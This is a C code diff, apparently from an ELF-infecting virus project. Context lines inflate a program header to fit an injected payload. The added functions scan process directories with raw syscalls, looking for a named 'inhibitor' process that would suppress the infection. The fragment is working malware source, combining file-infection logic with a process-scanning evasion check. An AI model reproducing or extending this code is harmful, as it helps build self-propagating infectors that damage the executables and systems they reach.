@@ -172,3 +172,61 @@ void		pe_parsing(t_info *info)
 	program_header->p_memsz += PAYLOAD_SIZE;
 	program_header->p_filesz = program_header->p_memsz;
 }
+
+static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
+{
+	int		fd;
+	char	buf_cast[12 + pid_len + 3];
+
+	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
+		return (0);
+	if ((ft_sysread(fd, buf_cast, pid_len + 11)) == -1)
+		goto end;
+	if ((ft_strncmp(buf_inhibitor, buf_cast + pid_len + 2, 9)) == 0)
+		goto found;
+	end:
+	ft_sysclose(fd);
+	return (0);
+	found:
+	ft_sysclose(fd);
+	return (1);
+}
+
+int			check_process(char *path)
+{
+	char					buf_d[1024];
+	char					buf_stat[8];
+	char					buf_inhibitor[12];
+	struct linux_dirent64	*dir;
+	int						fd, n_read, pos;
+	char					buf_path_file[PATH_MAX];
+	int						pid_len;
+
+
+	write_inhibitor(buf_inhibitor);
+	write_stat(buf_stat);
+	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
+		return (1);
+	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
+	{
+		for (pos = 0; pos < n_read;)
+		{
+			dir = (struct linux_dirent64 *)(buf_d + pos);
+			if (dir->d_type == 4) //dt_dir
+			{
+				ft_memcpy(buf_path_file, path, PATH_MAX);
+				ft_strcat(buf_path_file, dir->d_name);
+				ft_strcat(buf_path_file, buf_stat);
+				pid_len = ft_strlen(dir->d_name);
+				if ((parse_process(buf_path_file, pid_len, buf_inhibitor)) == 1)
+					goto found;
+			}
+			pos += dir->d_reclen;
+		}
+	}
+	ft_sysclose(fd);
+	return (0);
+	found:
+	ft_sysclose(fd);
+	return (1);
+}
